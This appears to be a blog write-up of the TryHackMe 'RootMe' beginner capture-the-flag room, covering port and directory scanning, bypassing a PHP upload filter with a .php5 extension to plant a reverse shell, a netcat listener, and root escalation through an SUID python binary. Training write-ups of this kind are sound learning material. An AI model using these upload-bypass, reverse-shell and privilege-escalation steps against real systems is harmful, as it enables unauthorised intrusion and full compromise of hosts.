---
clayout: ctf
title: RootMe
type: TryHackMe
date: 2025-02-20
level: Easy
icon: /ctf/tryhackme/rootme/icon-room.png
image: /ctf/tryhackme/rootme/icon-room.png
description: A ctf for beginners, can you root me?
ctf-link: https://tryhackme.com/room/rrootme
---

## Challenge Description

A ctf for beginners, can you root me?

## Challenge Overview

RootMe is an introductory-level Linux machine on TryHackMe designed to help beginners practice fundamental penetration
testing skills. The challenge involves exploiting a vulnerable file upload functionality to gain initial access and then
leveraging a misconfigured SUID permission on the Python binary for privilege escalation to root.

## Enumeration

### Nmap Scan

We begin by scanning the target machine to identify open ports and services:

```bash
$ nmap -sC -sV -v -p- -oN rootme.nmap 10.10.180.4
Nmap scan report for 10.10.180.4
Host is up (0.027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)
|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)
|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan reveals two open ports:

- **Port 22**: SSH service running OpenSSH 7.6p1
- **Port 80**: HTTP service running Apache 2.4.29

The presence of an HTTP service suggests a web application that may be vulnerable to exploitation.

### Web Enumeration

Navigating to `http://10.10.180.4/` displays the homepage of the web application:

![RootMe - Home Page](/ctf/tryhackme/rootme/home.png)

To discover hidden directories, we use Gobuster:

```bash
gobuster dir -w /usr/share/dirb/wordlists/common.txt -t 20 -x php,txt -u "http://10.10.180.4/" > rootme-gobuster.txt
```

The scan identifies two directories:

- `/panel/`: Potentially an administrative panel.
- `/uploads/`: Directory for uploaded files.

## Exploitation

### File Upload Vulnerability

Accessing the `/panel/` directory reveals a file upload functionality:

![RootMe - Panel Page](/ctf/tryhackme/rootme/panel.png)

Attempting to upload a PHP file results in an error:

![RootMe - Panel Error Message](/ctf/tryhackme/rootme/panel-error.png)

*Translation: "PHP is not allowed!"*

To bypass this restriction, we rename the file with a `.php5` extension and attempt the upload again:

![RootMe - Panel Success Message](/ctf/tryhackme/rootme/panel-success.png)

*Translation: "The file was uploaded successfully!"*

The file is now accessible in the `/uploads/` directory:

![RootMe - Uploaded File](/ctf/tryhackme/rootme/uploads.png)

### Gaining a Reverse Shell

To establish a reverse shell, we prepare a PHP reverse shell script (`exploit.php5`) with our IP and desired port.
Before executing the script, we set up a listener on our machine:

```bash
nc -lnvp 4444
```

Navigating to `http://10.10.180.4/uploads/exploit.php5` in the browser triggers the reverse shell, granting us access:

```bash
$ nc -lnvp 4444
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Post-Exploitation

### User Flag

To locate the user flag, we search for `user.txt`:

```bash
$ find / -type f -name user.txt 2>/dev/null
/var/www/user.txt
```

Reading the file reveals:

```bash
$ cat /var/www/user.txt
THM{user_flag}
```

### Privilege Escalation

To escalate privileges, we search for files with the SUID bit set:

```bash
find / -type f -perm -u=s 2>/dev/null
```

The scan reveals that `/usr/bin/python` has the SUID bit set. According
to [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid), we can exploit this to gain root access:

```bash
$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

### Root Flag

With root privileges, we can now access the root flag:

```bash
$ cat /root/root.txt
THM{root_flag}
```
